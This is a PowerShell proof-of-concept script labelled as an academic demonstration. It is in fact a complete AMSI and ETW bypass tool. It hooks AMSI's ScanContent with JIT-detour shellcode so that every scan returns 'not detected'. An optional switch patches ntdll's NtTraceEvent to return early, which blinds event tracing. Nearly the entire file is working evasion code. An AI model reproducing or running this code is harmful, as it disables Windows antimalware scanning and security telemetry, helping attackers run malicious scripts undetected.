# Concept Proof Framework - Dynamic Reflection Analysis
# Purpose: Academic demonstration of method pointer manipulation at runtime using JIT detouring.

function Invoke-JMPAMSI {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [switch]$VerboseOutput,

        [Parameter(Mandatory = $false, ParameterSetName = 'Interface', Position = 0)]
        [switch]$v,

        [Parameter(Mandatory = $false)]
        [switch]$etw
    )

    # Enable verbosity if the -v or -VerboseOutput flags are used
    if ($VerboseOutput -or $v) {
        $VerbosePreference = "Continue"
    }

    Write-Host "[*] Starting JMP-AMSI: JIT Hooking PoC" -ForegroundColor Cyan

    # Configuring the Structure of the Dynamic Assembly
    Write-Verbose "[*] Building a dynamic assembly for the Dummy method..."
    $AsmName = New-Object Reflection.AssemblyName("DynamicType")
    $AsmBuilder = [Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($AsmName, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModBuilder = $AsmBuilder.DefineDynamicModule("DynamicModule")

    # Define a public dynamic type
    $TypeBuilder = $ModBuilder.DefineType("DynamicType", "Public, Class") 

    # Define a static method named `Dummy` that takes two strings and returns an int (same signature as `ScanContent`)
    $MethodBuilder = $TypeBuilder.DefineMethod("Dummy", "Public, Static", [Int32], @([String], [String]))

    # Add the MethodImpl attribute (MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)
    # To mitigate JIT compiler optimizations
    $ImplOptions = [Runtime.CompilerServices.MethodImplOptions]::NoOptimization -bor [Runtime.CompilerServices.MethodImplOptions]::NoInlining
    $ImplCtor = [Runtime.CompilerServices.MethodImplAttribute].GetConstructor(@([Runtime.CompilerServices.MethodImplOptions]))
    $AttrBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ImplCtor, @($ImplOptions))
    $MethodBuilder.SetCustomAttribute($AttrBuilder)

    # Get the IL generator and output IL instructions
    Write-Verbose "[*] Generating IL code to return 1 (simulates a clean scan)..."
    $ILGen = $MethodBuilder.GetILGenerator()
    $ILGen.Emit([Reflection.Emit.OpCodes]::Ldc_I4_1)   # CReturn the value 1 - AMSI_RESULT_NOT_DETECTED
    $ILGen.Emit([Reflection.Emit.OpCodes]::Ret)        # Return

    # Define SetLastError for Win32 functions
    $DllCtor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $LastErrorField = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    $SetLastErrorAttr = New-Object Reflection.Emit.CustomAttributeBuilder($DllCtor, @('kernel32.dll'), [Reflection.FieldInfo[]]@($LastErrorField), @($true))

    # Define PInvoke methods
    Write-Verbose "[*] Importing P/Invoke for VirtualProtect and FlushInstructionCache..."
    $FlushCacheMethod = $TypeBuilder.DefinePInvokeMethod('FlushInstructionCache', 'kernel32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([IntPtr], [IntPtr], [Uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto') 
    $FlushCacheMethod.SetCustomAttribute($SetLastErrorAttr)

    $PInvokeProtect = $TypeBuilder.DefinePInvokeMethod('VirtualProtect', 'kernel32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [UInt32], @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto')
    $PInvokeProtect.SetCustomAttribute($SetLastErrorAttr)

    # Create the dynamic type
    $DynamicType = $TypeBuilder.CreateType()
    $ReplacementMethod = $DynamicType.GetMethod("Dummy")

    # Get the original ScanContent function
    Write-Verbose "[*] Searching for the ScanContent class and method in the current AppDomain..."
    $CurrentDomain = [System.AppDomain]::CurrentDomain
    $LoadedAssemblies = $CurrentDomain.GetAssemblies()

    $TargetTypes = foreach ($Asm in $LoadedAssemblies) {
        try { $Asm.GetTypes() } catch { continue }
    }

    # ScanContent search
    $AllMethods = $TargetTypes.GetMethods([System.Reflection.BindingFlags]'Static,Instance,NonPublic')
    $OriginalMethod = $AllMethods | Where-Object { $_.Name -eq "ScanContent" }

    if (-not $OriginalMethod) {
        Write-Error "[!] No se pudo encontrar el metodo ScanContent."
        return
    }
    
    Write-Host "[+] ScanContent method successfully located." -ForegroundColor Green

    # Obtaining native (JIT-compiled) memory pointers
    $OriginalSite = $OriginalMethod.MethodHandle.GetFunctionPointer()
    $ReplacementSite = $ReplacementMethod.MethodHandle.GetFunctionPointer()

    Write-Verbose "[*] -> Original Pointer (ScanContent): 0x$($OriginalSite.ToString('X'))"
    Write-Verbose "[*] -> Pointer Replacement (Dummy): 0x$($ReplacementSite.ToString('X'))"

    # Generate architecture-specific detour shellcode (JIT Detour)
    $PtrSize = [Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
    Write-Verbose "[*] Compilando Payload de desvio (JMP). Arquitectura detectada: $(if($PtrSize -eq 8){'64-bit'}else{'32-bit'})"

    if ($PtrSize -eq 8) {
        # x64 Architecture: Absolute Move to R11 and Jump
        # mov r11, replacementSite; 
        # jmp r11
        [Byte[]]$PatchBytes = @(0x49, 0xBB, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xFF, 0xE3)
        $AddressBytes = [BitConverter]::GetBytes($ReplacementSite.ToInt64())
    } else {
        # x86 Architecture: Push and Ret
        # push replacementSite; 
        # ret
        [Byte[]]$PatchBytes = @(0x68, 0x0, 0x0, 0x0, 0x0, 0xC3)
        $AddressBytes = [BitConverter]::GetBytes($ReplacementSite.ToInt32())
    }

    # Copy the memory address into the jump byte array
    for ($i = 0; $i -lt $AddressBytes.Length; $i++) {
        $PatchBytes[$i + 2] = $AddressBytes[$i]
    }

    # Modify permissions in the ScanContent function to allow writing
    $PAGE_EXECUTE_READWRITE = 0x00000040
    $PAGE_EXECUTE_WRITECOPY = 0x00000080
    [UInt32]$OriginalProtection = 0

    Write-Verbose "[*] Changing the page's permissions to PAGE_EXECUTE_READWRITE..."

     # Call to VirtualProtect and error checking
     if (-not $DynamicType::VirtualProtect($OriginalSite, [UIntPtr]::new($PatchBytes.Length), $PAGE_EXECUTE_READWRITE, [ref]$OriginalProtection)) {
        # Retrieve the Win32 error code using SetLastErrorAttr and convert it to a string
        $Win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        $ErrorMsg = (New-Object System.ComponentModel.Win32Exception($Win32Error)).Message
        Write-Warning "Failed to change permissions with VirtualProtect on ScanContent. Win32 Error ($Win32Error): $ErrorMsg"
        return
    }
        
    # Write the patch into the original function using Marshal
    [Runtime.InteropServices.Marshal]::Copy($PatchBytes, 0, $OriginalSite, $PatchBytes.Length)

    Write-Verbose "[*] Restoring the original permissions of the memory page..."
    
    # Restore the original protection permissions of the memory and check for errors
    if (-not $DynamicType::VirtualProtect($OriginalSite, [UIntPtr]::new($PatchBytes.Length), $OriginalProtection, [ref]$OriginalProtection)) {
        $Win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        $ErrorMsg = (New-Object System.ComponentModel.Win32Exception($Win32Error)).Message
        Write-Warning "[!] Failed to restore original permissions. Win32 error ($Win32Error): $ErrorMsg"
        return
    }
        
    $DynamicType::FlushInstructionCache([IntPtr]::Zero, $OriginalSite, $PatchBytes.Length) | Out-Null

    Write-Host "[+] ScanContent hook successfully applied." -ForegroundColor Green

    if ($etw) {
        Write-Host "`n[*] Starting ETW patching (NtTraceEvent)..." -ForegroundColor Cyan
        
        # Add WinForms assembly required
        try {
            Add-Type -AssemblyName System.Windows.Forms
        }
        catch {
            Write-Error "[!] Failed to load WinForms assembly."
            return
        }

        # Obtain native methods
        $unsafeMethodsType = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')

        # Get GetAddres address using native methods
        Write-Verbose "[*] Resolving pointer to GetProcAddress..."
        $GetAddres = $unsafeMethodsType.GetMethod("GetProcAddress")
        if (-not $GetAddres) {
            Write-Error "[!] Error getting the GetProcAddress method from UnsafeNativeMethods."
            return
        }

        $ntdll = [System.Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object { $_.ModuleName -eq 'ntdll.dll' }
        $ntdllBase = $ntdll.BaseAddress
        Write-Verbose "[*] -> Base of ntdll.dll: 0x$($ntdllBase.ToString('X'))"

        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $ntdllBase)

        Write-Verbose "[*] Getting address from NtTraceEvent..."
        $NtTraceEventAddr = $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, "NtTraceEvent"))
        if ($NtTraceEventAddr -eq [IntPtr]::Zero) {
            Write-Error "[!] Failed to get NtTraceEvent address. Aborting ETW patch."
            return
        }
        Write-Verbose "[*] -> NtTraceEvent Pointer: 0x$($NtTraceEventAddr.ToString('X'))"  

        Write-Verbose "[*] Scanning the first 32 bytes looking for the instruction RET (0xC3)..."
        $RetAddr = [IntPtr]::Zero
        for ($i = 0; $i -lt 32; $i++) {
           # Read byte by byte by advancing the pointer
            $currentAddr = [IntPtr]($NtTraceEventAddr.ToInt64() + $i)
            $byte = [System.Runtime.InteropServices.Marshal]::ReadByte($currentAddr)
            
            if ($byte -eq 0xC3) { # 0xC3 es el opcode de RET
                $RetAddr = $currentAddr
                Write-Verbose "[*] -> RET (0xC3) found at: 0x$($RetAddr.ToString('X')) (Offset: +$i bytes)"
                break
            }
        }

        if ($RetAddr -eq [IntPtr]::Zero) { 
            Write-Error "[!] No RET instruction found in the first 32 bytes of NtTraceEvent."
            return 
        }

        # Calculate the offset for the relative JMP (E9)
        # Formula: Destination - Origin - 5
        $offset = [int]($RetAddr.ToInt64() - $NtTraceEventAddr.ToInt64() - 5)
        $offsetBytes = [System.BitConverter]::GetBytes($offset)

        # Build the patch: 0xE9 followed by the 4 bytes of the offset
        $patch = [byte[]](0xE9, $offsetBytes[0], $offsetBytes[1], $offsetBytes[2], $offsetBytes[3])
        Write-Verbose "[*] -> Patch (JMP Relative) constructed: $([BitConverter]::ToString($patch))"

        Write-Verbose "[*] Changing memory protections on NtTraceEvent to PAGE_EXECUTE_WRITECOPY (0x80)..."
        if (-not $DynamicType::VirtualProtect($NtTraceEventAddr, [UIntPtr]::new(5), $PAGE_EXECUTE_WRITECOPY, [ref]$OriginalProtection)) {
            $Win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $ErrorMsg = (New-Object System.ComponentModel.Win32Exception($Win32Error)).Message
            Write-Error "[!] Failed to change permissions with VirtualProtect on NtTraceEvent. Win32 Error ($Win32Error): $ErrorMsg"
            return
        }

        # Write the 5 bytes of the patch to memory
        Write-Verbose "[*] Writing the patch to NtTraceEvent..."
        for ($i = 0; $i -lt $patch.Length; $i++) {
            # WriteByte takes (Base Pointer, Offset, Byte Value)
            [System.Runtime.InteropServices.Marshal]::WriteByte($NtTraceEventAddr, $i, $patch[$i])
        }
    
        Write-Verbose "[*] Post-write memory integrity check..."
        $verificacionETW = $true
        for ($x = 0; $x -lt 5; $x++) {
            $byteLeido = [System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]::Add($NtTraceEventAddr, $x))
            if ($byteLeido -ne $patch[$x]) {
                $verificacionETW = $false
                break
            }
        }

        if (-not $verificacionETW) {
            Write-Warning "[!] Warning: The bytes in memory do not match the generated patch. The bypass may fail."
        } else {
            Write-Verbose "[*] -> Integrity validated."
        }

       # Restore original protection
        Write-Verbose "[*] Restoring NtTraceEvent memory protections..."
        if (-not $DynamicType::VirtualProtect($NtTraceEventAddr, [UIntPtr]::new(5), $OriginalProtection, [ref]$OriginalProtection)) {
            $Win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $ErrorMsg = (New-Object System.ComponentModel.Win32Exception($Win32Error)).Message
            Write-Warning "[!] Failed to restore permissions on NtTraceEvent. Win32 Error ($Win32Error): $ErrorMsg"
        }

        $DynamicType::FlushInstructionCache([IntPtr]::Zero, $NtTraceEventAddr, 5) | Out-Null

        Write-Host "[+] ETW (Tail Jump) patch successfully applied." -ForegroundColor Green
    }
}